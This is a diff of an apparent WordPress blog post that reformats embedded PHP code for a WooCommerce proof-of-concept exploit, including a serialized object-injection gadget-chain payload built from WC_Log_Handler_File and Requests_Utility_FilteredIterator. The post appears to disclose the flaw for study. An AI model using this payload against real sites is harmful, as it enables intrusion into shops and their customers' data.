@@ -150,9 +150,7 @@ body.custom-background { background-color: #ffffff; }
 
 
 
-<pre class="wp-block-code"><code lang="php" class="language-php"><?php
-//MIT license
-define("WOO_POC_WIZZARD", TRUE);
+<pre class="wp-block-code"><code lang="php" class="language-php">define("WOO_POC_WIZZARD", TRUE);
 if (WOO_POC_WIZZARD){
     if ( isset($argv) && is_array($argv) ){
         if ( sizeof($argv) >= 2 ){
@@ -229,9 +227,7 @@ exit();
 
 
 
-<pre class="wp-block-code"><code lang="php" class="language-php"><?php 
-
-//grab it from some payload generator Woo/WP or PHP related 
+<pre class="wp-block-code"><code lang="php" class="language-php">//grab it from some payload generator Woo/WP or PHP related 
 //https://gist.github.com/Slavco/946905eef6f9cb0f03a2ed2bdee83d9c
 $payload_real = 'O:19:"WC_Log_Handler_File":1:{S:10:"\00\2A\00\68\61\6E\64\6C\65\73";C:33:"Requests_Utility_FilteredIterator":101:{x:i:0;a:1:{i:0;s:11:"ScotchDolly";};m:a:1:{S:11:"\00\2A\00\63\61\6C\6C\62\61\63\6B";s:9:"error_log";}}}';
 
